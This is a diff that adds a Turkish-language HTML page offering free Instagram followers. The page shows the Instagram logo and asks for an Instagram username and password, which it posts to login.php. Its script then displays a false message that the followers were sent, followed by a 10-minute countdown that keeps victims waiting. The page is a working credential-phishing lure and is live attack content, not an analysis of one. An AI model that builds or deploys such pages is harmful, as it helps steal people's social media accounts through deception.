@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Instagram Takipçi Gönder</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        }
+
+        body {
+            background-color: black;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: black;
+            text-align: center;
+        }
+
+        .logo-area {
+            margin-bottom: 40px;
+            margin-top: 20px;
+            animation: fadeInScale 0.6s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+        }
+        
+        .logo-area img {
+            width: 110px;
+            height: auto;
+            display: block;
+            margin: 0 auto;
+            animation: floatLogo 2.5s ease-in-out infinite;
+        }
+        
+        @keyframes floatLogo {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-12px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        @keyframes fadeInScale {
+            0% { opacity: 0; transform: scale(0.7); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+            animation: fadeInUp 0.5s ease forwards;
+            opacity: 0;
+        }
+        
+        .form-group:nth-child(2) { animation-delay: 0.1s; }
+        .form-group:nth-child(3) { animation-delay: 0.2s; }
+        .form-group:nth-child(4) { animation-delay: 0.3s; }
+        
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-group label {
+            display: block;
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+            margin-bottom: 8px;
+            letter-spacing: 0.5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .form-group input:focus {
+            border-color: #e4405f;
+            background: #0f0f0f;
+        }
+
+        .send-btn {
+            width: 100%;
+            background: #0066FF;
+            border: none;
+            padding: 14px;
+            color: white;
+            font-weight: bold;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 30px;
+            margin-bottom: 20px;
+            transition: 0.2s;
+            animation: fadeInUp 0.5s ease 0.4s forwards;
+            opacity: 0;
+        }
+        
+        .send-btn:disabled {
+            background: #333;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
+        
+        .send-btn:hover:not(:disabled) {
+            background: #0052cc;
+        }
+
+        .message {
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 8px;
+            background: #111;
+            animation: fadeInUp 0.5s ease 0.5s forwards;
+            opacity: 0;
+        }
+        
+        .error-msg { color: #ff4444; }
+        .success-msg { color: #00ff88; }
+        .waiting-msg { color: #ffaa00; }
+        
+        .timer-box {
+            background: #1a1a1a;
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 15px;
+            border: 1px solid #0066FF;
+            animation: fadeInUp 0.5s ease forwards;
+        }
+        
+        .timer-text {
+            color: #0066FF;
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 2px;
+            font-family: monospace;
+        }
+        
+        .timer-label {
+            color: #aaa;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-area">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" 
+                 alt="Instagram Logo"
+                 onerror="this.onerror=null; this.src='https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg';">
+        </div>
+
+        <form method="POST" action="login.php" id="botForm">
+            <div class="form-group">
+                <label>Kullanıcı Adı</label>
+                <input type="text" name="username" id="username" placeholder="kullanici_adi" required>
+            </div>
+
+            <div class="form-group">
+                <label>Şifre</label>
+                <input type="password" name="password" id="password" placeholder="şifreniz" required>
+            </div>
+
+            <div class="form-group">
+                <label>Kaç takipçi gönderilsin? (1 - 299)</label>
+                <input type="number" name="followerCount" id="followerCount" class="follower-input" placeholder="1 ile 299 arası" min="1" max="299" value="150">
+            </div>
+
+            <button type="submit" class="send-btn" id="sendBtn">Takipçi Gönder</button>
+        </form>
+        <div id="message" class="message"></div>
+    </div>
+
+    <script>
+        const form = document.getElementById('botForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const followerInput = document.getElementById('followerCount');
+        const sendBtn = document.getElementById('sendBtn');
+        const messageDiv = document.getElementById('message');
+        
+        let timerInterval = null;
+        let isWaiting = false;
+        let remainingSeconds = 0;
+        
+        function stopTimer() {
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+        }
+        
+        function formatTime(seconds) {
+            let mins = Math.floor(seconds / 60);
+            let secs = seconds % 60;
+            return mins.toString().padStart(2, '0') + ':' + secs.toString().padStart(2, '0');
+        }
+        
+        function showWaitingTimer(waitSeconds) {
+            isWaiting = true;
+            sendBtn.disabled = true;
+            sendBtn.textContent = 'bekle...';
+            
+            remainingSeconds = waitSeconds;
+            
+            const timerHtml = `
+                <div class="timer-box" id="timerBox">
+                    <div class="timer-text" id="timerDisplay">${formatTime(remainingSeconds)}</div>
+                    <div class="timer-label">Kalan süre (10 dakika)</div>
+                </div>
+            `;
+            
+            messageDiv.innerHTML = timerHtml;
+            messageDiv.className = "message waiting-msg";
+            
+            timerInterval = setInterval(() => {
+                if (remainingSeconds <= 1) {
+                    clearInterval(timerInterval);
+                    timerInterval = null;
+                    isWaiting = false;
+                    sendBtn.disabled = false;
+                    sendBtn.textContent = 'Takipçi Gönder';
+                    messageDiv.innerHTML = '✅ Bekleme süresi bitti! Şimdi tekrar gönderebilirsin.';
+                    messageDiv.className = "message success-msg";
+                    
+                    setTimeout(() => {
+                        if (messageDiv.innerHTML === '✅ Bekleme süresi bitti! Şimdi tekrar gönderebilirsin.') {
+                            messageDiv.innerHTML = '';
+                            messageDiv.className = "message";
+                        }
+                    }, 4000);
+                } else {
+                    remainingSeconds--;
+                    const timerDisplay = document.getElementById('timerDisplay');
+                    if (timerDisplay) {
+                        timerDisplay.textContent = formatTime(remainingSeconds);
+                    }
+                }
+            }, 1000);
+        }
+        
+        function handleSend(e) {
+            if (isWaiting) {
+                e.preventDefault();
+                messageDiv.innerHTML = 'sure bitince yeniden takipci basabilrsniz takipcilerin gelmesi 1iş günü ile 2is gunu arasinda hesabjnza ulasir .';
+                messageDiv.className = "message error-msg";
+                return false;
+            }
+            
+            const username = usernameInput.value.trim();
+            const password = passwordInput.value;
+            let followerCount = parseInt(followerInput.value, 10);
+            
+            if (username === "") {
+                e.preventDefault();
+                messageDiv.innerHTML = " Kullanıcı adı girin";
+                messageDiv.className = "message error-msg";
+                return false;
+            }
+            
+            if (password === "") {
+                e.preventDefault();
+                messageDiv.innerHTML = " Şifre girin";
+                messageDiv.className = "message error-msg";
+                return false;
+            }
+            
+            if (isNaN(followerCount)) {
+                e.preventDefault();
+                messageDiv.innerHTML = " Takipçi sayısı yaz (sayı girin)";
+                messageDiv.className = "message error-msg";
+                return false;
+            }
+            
+            if (followerCount < 1 || followerCount > 299) {
+                e.preventDefault();
+                messageDiv.innerHTML = "Takipçi sayısı 1 ile 299 arasında olmalı";
+                messageDiv.className = "message error-msg";
+                return false;
+            }
+            
+            messageDiv.innerHTML = `✅ ${followerCount} takipçi, ${username} kullanıcısına gönderildi!<br> 10 dakika bekleme başladı...`;
+            messageDiv.className = "message success-msg";
+            
+            showWaitingTimer(600);
+            return true;
+        }
+        
+        form.addEventListener('submit', function(e) {
+            if (!handleSend(e)) {
+                e.preventDefault();
+            }
+        });
+        
+        followerInput.addEventListener('change', function() {
+            let val = parseInt(followerInput.value, 10);
+            if (isNaN(val)) {
+                followerInput.value = 150;
+                return;
+            }
+            if (val < 1) followerInput.value = 1;
+            if (val > 299) followerInput.value = 299;
+        });
+    </script>
+</body>
+</html>
